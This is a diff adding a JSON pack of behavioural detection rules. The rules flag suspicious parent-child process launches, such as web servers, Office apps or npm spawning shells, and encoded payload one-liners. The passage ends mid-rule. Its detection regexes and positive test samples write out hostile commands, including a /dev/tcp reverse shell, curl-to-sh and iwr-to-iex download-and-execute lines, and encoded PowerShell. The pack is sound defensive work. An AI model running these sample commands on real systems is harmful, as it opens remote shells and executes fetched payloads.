@@ -1,0 +1,6849 @@
+{
+ "pack": "behavioural",
+ "rules": [
+  {
+   "id": "ioa-web-server-spawns-shell",
+   "name": "Web server process spawns a shell",
+   "description": "A web server parent starting a shell or command interpreter is the classic signature of a web shell, SQL command execution or an exploited service.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](nginx|httpd|apache2|php-fpm\\d*|php-cgi|lighttpd|caddy|tomcat\\d*|gunicorn|uwsgi|w3wp\\.exe|httpd\\.exe|php\\.exe)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](sh|bash|dash|zsh|ksh|ash|csh|tcsh|fish|cmd\\.exe|powershell\\.exe|pwsh\\.exe|pwsh|powershell)$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "web-server",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c id",
+      "parent_exe": "/usr/sbin/nginx"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/nginx",
+      "command": "nginx -t",
+      "parent_exe": "/usr/sbin/nginx"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash",
+      "parent_exe": "/usr/sbin/sshd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-database-spawns-shell",
+   "name": "Database server process spawns a shell",
+   "description": "A database server parent starting a shell or command interpreter is the classic signature of a web shell, SQL command execution or an exploited service.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(mysqld|mariadbd|postgres|mongod|redis-server|oracle|sqlservr|sqlservr\\.exe|mysqld\\.exe)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](sh|bash|dash|zsh|ksh|ash|csh|tcsh|fish|cmd\\.exe|powershell\\.exe|pwsh\\.exe|pwsh|powershell)$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "database",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -i",
+      "parent_exe": "/usr/sbin/mysqld"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/mysqld_safe",
+      "command": "mysqld_safe",
+      "parent_exe": "/usr/sbin/mysqld"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash",
+      "parent_exe": "/usr/sbin/sshd"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-webserver-spawns-network-tool",
+   "name": "Web server spawns download or relay tool",
+   "description": "A web-serving process launching curl, wget, nc, nmap or similar indicates remote code execution used to pull tooling or pivot.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](nginx|httpd|apache2|php-fpm\\d*|php-cgi|lighttpd|caddy|tomcat\\d*|gunicorn|uwsgi|w3wp\\.exe|httpd\\.exe|php\\.exe)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(curl|wget|nc|ncat|netcat|socat|nmap|fetch|certutil\\.exe|bitsadmin\\.exe)$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://203.0.113.9/x.sh",
+      "parent_exe": "/usr/sbin/apache2"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://203.0.113.9/x.sh",
+      "parent_exe": "/usr/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-webserver-spawns-recon-command",
+   "name": "Web server spawns identity or recon command",
+   "description": "Host discovery commands (id, whoami, uname, ifconfig, net user) run directly by a web server process are typical first commands of a web shell.",
+   "tactic": "Discovery",
+   "technique": "T1033",
+   "technique_name": "System Owner/User Discovery",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](nginx|httpd|apache2|php-fpm\\d*|php-cgi|lighttpd|caddy|tomcat\\d*|gunicorn|uwsgi|w3wp\\.exe|httpd\\.exe|php\\.exe)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](id|whoami|uname|hostname|ifconfig|ip|ipconfig|net|net1|systeminfo|ps|tasklist)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/whoami",
+      "command": "whoami",
+      "parent_exe": "/usr/sbin/nginx"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\whoami.exe",
+      "command": "whoami /all",
+      "parent_exe": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/whoami",
+      "command": "whoami",
+      "parent_exe": "/usr/bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-java-spawns-shell-network",
+   "name": "Java process spawns shell with network tooling",
+   "description": "A JVM parent running a shell whose command line fetches remote content or opens a socket indicates deserialization or JNDI style exploitation.",
+   "tactic": "Initial Access",
+   "technique": "T1190",
+   "technique_name": "Exploit Public-Facing Application",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/java(\\.exe)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](sh|bash|dash|zsh|ksh|ash|csh|tcsh|fish|cmd\\.exe|powershell\\.exe|pwsh\\.exe|pwsh|powershell)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget|nc |ncat|/dev/tcp|bash -i|python|perl)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "rce",
+    "jvm"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl http://198.51.100.4/a|sh",
+      "parent_exe": "/usr/bin/java"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c ./gradlew build",
+      "parent_exe": "/usr/bin/java"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-nodejs-spawns-reverse-shell",
+   "name": "Node.js child opens reverse shell",
+   "description": "A node parent running a shell with /dev/tcp, nc -e or mkfifo redirection is a reverse shell from a compromised application.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(node|nodejs|npm)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/dev/tcp/|nc .*-e |mkfifo .*nc |socat .*exec)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+      "parent_exe": "/usr/bin/node"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tsc --build",
+      "parent_exe": "/usr/bin/node"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-scripting-runtime-spawns-reverse-shell",
+   "name": "Python, Ruby or PHP child opens reverse shell",
+   "description": "A scripting-runtime parent whose child shell redirects to /dev/tcp or uses nc -e indicates injected code opening a reverse shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "critical",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(python[\\d.]*|ruby|php[\\d.]*|perl|gunicorn|uwsgi)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/dev/tcp/|nc .*-e |mkfifo .*nc )"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "reverse-shell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c exec 5<>/dev/tcp/203.0.113.9/9001",
+      "parent_exe": "/usr/bin/python3"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c pip list",
+      "parent_exe": "/usr/bin/python3"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-office-spawns-interpreter",
+   "name": "Office or PDF reader spawns an interpreter",
+   "description": "Document applications launching shells, script hosts or LOLBins reveal macro or exploit based execution from a lure document.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](winword|excel|powerpnt|outlook|onenote|msaccess|mspub|visio|acrord32|acrobat|foxitreader|soffice|Microsoft Word|Microsoft Excel|Microsoft PowerPoint|Microsoft Outlook)(\\.exe|\\.bin)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|python[\\d.]*|perl|osascript|bash|sh|zsh|curl|wget)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "office",
+    "macro"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c whoami",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e x",
+      "parent_exe": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\splwow64.exe",
+      "command": "splwow64.exe",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-office-spawns-encoded-powershell",
+   "name": "Office app spawns encoded or hidden PowerShell",
+   "description": "An Office parent starting PowerShell with encoded, hidden-window or download arguments is a hallmark of weaponised documents.",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "technique_name": "PowerShell",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](winword|excel|powerpnt|outlook|onenote|msaccess|mspub|visio|acrord32|acrobat|foxitreader|soffice|Microsoft Word|Microsoft Excel|Microsoft PowerPoint|Microsoft Outlook)(\\.exe|\\.bin)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-enc|-e |-encodedcommand|-w hidden|-windowstyle hidden|downloadstring|iex)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "office",
+    "powershell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -w hidden -enc SQBFAFgA",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\EXCEL.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -File C:\\scripts\\report.ps1",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-office-spawns-script-host",
+   "name": "Office app spawns wscript, cscript or mshta",
+   "description": "An Office parent running script hosts is document-driven payload delivery.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.005",
+   "technique_name": "Mshta",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](winword|excel|powerpnt|outlook|onenote|msaccess|mspub|visio|acrord32|acrobat|foxitreader|soffice|Microsoft Word|Microsoft Excel|Microsoft PowerPoint|Microsoft Outlook)(\\.exe|\\.bin)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(wscript|cscript|mshta)\\.exe$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "office"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta http://198.51.100.7/a.hta",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\mshta.exe",
+      "command": "mshta http://198.51.100.7/a.hta",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-mail-client-spawns-script",
+   "name": "Mail client spawns script or shell",
+   "description": "Outlook or Thunderbird launching script interpreters points to a malicious attachment or mail-rule execution.",
+   "tactic": "Initial Access",
+   "technique": "T1566.001",
+   "technique_name": "Phishing: Spearphishing Attachment",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](outlook|thunderbird|Microsoft Outlook)(\\.exe)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](powershell|cmd|wscript|cscript|mshta|bash|sh|python[\\d.]*)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "phishing"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript invoice.js",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wscript.exe",
+      "command": "wscript invoice.js",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-browser-spawns-interpreter",
+   "name": "Browser spawns shell or script interpreter",
+   "description": "A browser parent launching a shell, osascript or script host indicates a drive-by exploit or a pasted-command lure.",
+   "tactic": "Execution",
+   "technique": "T1204.001",
+   "technique_name": "User Execution: Malicious Link",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "[/\\\\](chrome|firefox|msedge|safari|brave|opera|Google Chrome|Safari|Firefox)(\\.exe)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](cmd|powershell|pwsh|wscript|cscript|mshta|bash|sh|zsh|osascript|python[\\d.]*)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "browser"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl x|sh",
+      "parent_exe": "/Applications/Safari.app/Contents/MacOS/Safari"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/open",
+      "command": "open file.pdf",
+      "parent_exe": "/Applications/Safari.app/Contents/MacOS/Safari"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-explorer-powershell-download-exec",
+   "name": "Explorer launches PowerShell download-and-execute",
+   "description": "Explorer starting PowerShell or mshta with iwr/iex or a URL matches pasted Run-dialog commands from fake-captcha lures.",
+   "tactic": "Execution",
+   "technique": "T1204.004",
+   "technique_name": "Malicious Copy and Paste",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "explorer\\.exe$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(powershell|pwsh|mshta|cmd)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(iwr |invoke-webrequest|downloadstring|irm .*\\| *iex|mshta +https?://|curl .*\\| *(iex|cmd))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "clickfix"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c iwr http://198.51.100.1/a|iex",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Process",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-pkgmgr-child-fetches-raw-ip",
+   "name": "Package manager child fetches from a raw IP",
+   "description": "Install hooks or build steps that run curl or wget against a bare IP address instead of a registry hostname are a supply-chain payload pattern.",
+   "tactic": "Initial Access",
+   "technique": "T1195.002",
+   "technique_name": "Compromise Software Supply Chain",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(npm|node|yarn|pnpm|pip[\\d.]*|python[\\d.]*|gem|cargo|make|gradle|mvn|dpkg|rpm|apt|apt-get|yum|dnf|brew|Runner\\.Worker|jenkins)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(curl|wget|sh|bash|nc)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "supply-chain"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://203.0.113.50/p.sh",
+      "parent_exe": "/usr/bin/npm"
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget http://198.51.100.3:8080/x",
+      "parent_exe": "/usr/bin/pip"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://registry.npmjs.org/x",
+      "parent_exe": "/usr/bin/npm"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ci-runner-pipes-raw-ip-to-shell",
+   "name": "CI runner step pipes raw-IP download to shell",
+   "description": "A build agent child running a fetch from a bare IP piped to a shell reflects poisoned pipeline steps staging code.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "(runner|Runner\\.Worker|jenkins|buildkite|teamcity|agent\\.listener|gitlab-runner|circleci)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\S*.*\\|\\s*(sh|bash)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ci"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl http://203.0.113.7/s | sh",
+      "parent_exe": "/home/runner/bin/Runner.Worker"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c curl https://github.com/x/releases/a | sh",
+      "parent_exe": "/home/runner/bin/Runner.Worker"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-npm-script-shell-network",
+   "name": "npm lifecycle script runs shell with network tool",
+   "description": "An npm parent running sh whose command line has curl, wget or /dev/tcp against a URL or IP is a malicious install-script pattern.",
+   "tactic": "Execution",
+   "technique": "T1195.002",
+   "technique_name": "Compromise Software Supply Chain",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(npm|node|yarn|pnpm)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(sh|bash|dash)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget|nc |/dev/tcp)\\S*\\s.*(http|\\d+\\.\\d+\\.\\d+\\.\\d+)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "npm"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl -fsSL http://203.0.113.5/i | sh",
+      "parent_exe": "/usr/bin/npm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c node-gyp rebuild",
+      "parent_exe": "/usr/bin/npm"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-pip-build-network-shell",
+   "name": "Python packaging step spawns network shell",
+   "description": "pip or setup.py children running shell with curl, wget or nc against an IP or paste host indicate a trojanised sdist executing at install.",
+   "tactic": "Execution",
+   "technique": "T1195.002",
+   "technique_name": "Compromise Software Supply Chain",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(pip[\\d.]*|python[\\d.]*)$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(sh|bash|dash)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget|nc )\\s+\\S*(\\d+\\.\\d+\\.\\d+\\.\\d+|pastebin|transfer\\.sh)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "pypi"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c wget 203.0.113.5/a -O- | sh",
+      "parent_exe": "/usr/bin/python3"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c gcc -c x.c",
+      "parent_exe": "/usr/bin/python3"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-installer-script-fetches-and-runs",
+   "name": "Package installer script downloads and executes",
+   "description": "dpkg or rpm maintainer scripts invoking curl or wget piped to a shell mean a package fetches a second stage during install.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "/(dpkg|rpm|apt|apt-get|yum|dnf)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(curl|wget)\\s.*\\|\\s*(sh|bash)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "package"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c curl http://x.example/a|sh",
+      "parent_exe": "/usr/bin/dpkg"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c update-alternatives --install",
+      "parent_exe": "/usr/bin/dpkg"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-base64-decode-pipe-interpreter",
+   "name": "base64 decode piped into interpreter",
+   "description": "A single command line decodes base64 and feeds it to a shell or interpreter, hiding the payload from the command text.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027",
+   "technique_name": "Obfuscated Files or Information",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "base64\\s+(-d|--decode|-D)\\b.*\\|\\s*(sh|bash|zsh|python[\\d.]*|perl|ruby)\\b"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "obfuscation"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo aWQ= | base64 -d | bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo aWQ= | base64 -d > out.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-xxd-reverse-pipe-shell",
+   "name": "Hex decode piped to shell",
+   "description": "xxd -r -p or printf hex decoding piped into a shell hides a payload as hex text.",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "technique_name": "Deobfuscate/Decode Files or Information",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(xxd\\s+-r|printf\\s+['\\\"]?\\\\x).*\\|\\s*(sh|bash|python[\\d.]*|perl)\\b"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "obfuscation"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo 69640a | xxd -r -p | sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c xxd -r -p dump.hex > file.bin"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-openssl-enc-pipe-shell",
+   "name": "openssl decrypt piped to shell",
+   "description": "openssl enc -d output fed to a shell or interpreter indicates an encrypted payload stage.",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "technique_name": "Deobfuscate/Decode Files or Information",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "openssl\\s+(enc|aes\\S*|base64)\\b.*-d\\b.*\\|\\s*(sh|bash|python[\\d.]*|perl)\\b"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "obfuscation"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c openssl enc -d -aes-256-cbc -k x -in p.bin | bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/openssl",
+      "command": "openssl enc -d -aes-256-cbc -in p.bin -out p.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-python-c-decode-exec",
+   "name": "python -c decodes and executes",
+   "description": "python -c with b64decode, zlib or marshal decoding followed by exec or eval is a common packed one-liner stager.",
+   "tactic": "Execution",
+   "technique": "T1059.006",
+   "technique_name": "Python",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "python[\\d.]*(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-c\\s.*((b64decode|decompress|fromhex|marshal\\.loads).*(exec|eval)|(exec|eval).*(b64decode|decompress|fromhex|marshal\\.loads))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "python"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c exec(__import__('base64').b64decode('aW1wb3J0'))"
+     },
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c import zlib;exec(zlib.decompress(b'x'))"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c print(1+1)"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-perl-e-decode-eval",
+   "name": "perl -e with decode and eval",
+   "description": "perl -e one-liners that decode base64 or unpack data then eval run hidden payloads.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "perl[\\d.]*(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-e\\s.*(eval.*(decode_base64|unpack)|(decode_base64|unpack).*eval)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "perl"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/perl",
+      "command": "perl -MMIME::Base64 -e eval(decode_base64('cHJpbnQ='))"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/perl",
+      "command": "perl -e print 'hi'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ruby-e-socket-exec",
+   "name": "ruby one-liner opens socket and execs shell",
+   "description": "ruby -rsocket -e with TCPSocket and exec, spawn or popen is a reverse shell one-liner.",
